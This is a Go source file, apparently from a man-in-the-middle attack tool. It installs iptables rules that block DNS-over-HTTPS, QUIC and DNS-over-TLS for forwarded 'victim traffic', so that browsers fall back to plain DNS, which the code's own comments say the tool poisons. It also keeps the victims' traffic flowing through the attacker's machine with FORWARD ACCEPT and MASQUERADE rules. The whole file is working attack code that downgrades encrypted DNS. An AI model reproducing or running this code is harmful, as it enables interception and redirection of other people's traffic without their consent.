//go:build linux

package dns

import (
	"fmt"
	"log"
	"os/exec"
	"strings"
)

// Known DNS-over-HTTPS provider IPs.
// When blocked, browsers fall back to regular system DNS (which we poison).
var dohProviderIPs = []string{
	// Google Public DNS
	"8.8.8.8", "8.8.4.4",
	"2001:4860:4860::8888", "2001:4860:4860::8844",
	// Cloudflare DNS
	"1.1.1.1", "1.0.0.1",
	"2606:4700:4700::1111", "2606:4700:4700::1001",
	// Cloudflare DoH specific
	"104.16.248.249", "104.16.249.249",
	// Quad9
	"9.9.9.9", "149.112.112.112",
	"2620:fe::fe", "2620:fe::9",
	// Mozilla Cloudflare (Firefox default DoH)
	"mozilla.cloudflare-dns.com",
	// OpenDNS
	"208.67.222.222", "208.67.220.220",
	// NextDNS
	"45.90.28.0", "45.90.30.0",
	// Comcast/Xfinity
	"96.113.151.145",
}

// Known DoH hostnames — resolve and block these too
var dohHostnames = []string{
	"dns.google",
	"dns.google.com",
	"cloudflare-dns.com",
	"mozilla.cloudflare-dns.com",
	"dns.quad9.net",
	"doh.opendns.com",
	"dns.nextdns.io",
	"doh.xfinity.com",
	"dns11.quad9.net",
	"dns.adguard-dns.com",
	"families.cloudflare-dns.com",
	"security.cloudflare-dns.com",
	"chrome.cloudflare-dns.com",
}

// BlockDoH adds iptables rules to block DNS-over-HTTPS traffic to known providers.
// This forces browsers to fall back to regular DNS (port 53), which we intercept.
func BlockDoH() error {
	log.Println("[DoH BYPASS] Blocking DNS-over-HTTPS providers...")

	// CRITICAL: Ensure the FORWARD chain accepts traffic (default policy may be DROP).
	// Without this, ALL victim traffic is silently dropped and nothing works.
	run("iptables", "-P", "FORWARD", "ACCEPT")
	run("iptables", "-t", "nat", "-A", "POSTROUTING", "-j", "MASQUERADE")

	blocked := 0

	// Block known DoH IPs on port 443 — both in FORWARD (victim traffic) and OUTPUT (our own)
	for _, ip := range dohProviderIPs {
		if strings.Contains(ip, ":") {
			// IPv6
			run("ip6tables", "-I", "FORWARD", "-d", ip, "-p", "tcp", "--dport", "443", "-j", "DROP")
			run("ip6tables", "-I", "OUTPUT", "-d", ip, "-p", "tcp", "--dport", "443", "-j", "DROP")
		} else {
			if err := run("iptables", "-I", "FORWARD", "-d", ip, "-p", "tcp", "--dport", "443", "-j", "DROP"); err == nil {
				blocked++
			}
			run("iptables", "-I", "OUTPUT", "-d", ip, "-p", "tcp", "--dport", "443", "-j", "DROP")
		}
	}

	// Block QUIC (UDP 443) — Chrome/Firefox use this for DoH/DoQ
	run("iptables", "-I", "FORWARD", "-p", "udp", "--dport", "443", "-j", "DROP")
	run("iptables", "-I", "OUTPUT", "-p", "udp", "--dport", "443", "-j", "DROP")
	run("ip6tables", "-I", "FORWARD", "-p", "udp", "--dport", "443", "-j", "DROP")

	// Block DNS over TLS (port 853) — Android Private DNS uses this
	run("iptables", "-I", "FORWARD", "-p", "tcp", "--dport", "853", "-j", "DROP")
	run("iptables", "-I", "FORWARD", "-p", "udp", "--dport", "853", "-j", "DROP")
	run("iptables", "-I", "OUTPUT", "-p", "tcp", "--dport", "853", "-j", "DROP")
	run("ip6tables", "-I", "FORWARD", "-p", "tcp", "--dport", "853", "-j", "DROP")

	log.Printf("[DoH BYPASS] Blocked %d DoH provider IPs + QUIC + DoT (port 853)", blocked)
	log.Println("[DoH BYPASS] Browsers will fall back to regular DNS → our poisoner catches it")

	return nil
}

// UnblockDoH removes all DoH blocking rules
func UnblockDoH() {
	log.Println("[DoH BYPASS] Removing DoH blocking rules...")

	for _, ip := range dohProviderIPs {
		if strings.Contains(ip, ":") {
			run("ip6tables", "-D", "FORWARD", "-d", ip, "-p", "tcp", "--dport", "443", "-j", "DROP")
		} else {
			run("iptables", "-D", "FORWARD", "-d", ip, "-p", "tcp", "--dport", "443", "-j", "DROP")
		}
	}

	run("iptables", "-D", "FORWARD", "-p", "udp", "--dport", "443", "-j", "DROP")
	run("ip6tables", "-D", "FORWARD", "-p", "udp", "--dport", "443", "-j", "DROP")

	run("iptables", "-D", "FORWARD", "-p", "tcp", "--dport", "853", "-j", "DROP")
	run("iptables", "-D", "FORWARD", "-p", "udp", "--dport", "853", "-j", "DROP")
	run("ip6tables", "-D", "FORWARD", "-p", "tcp", "--dport", "853", "-j", "DROP")

	log.Println("[DoH BYPASS] DoH blocking rules removed")
}

func run(name string, args ...string) error {
	cmd := exec.Command(name, args...)
	output, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("%s %s: %s: %w", name, strings.Join(args, " "), string(output), err)
	}
	return nil
}
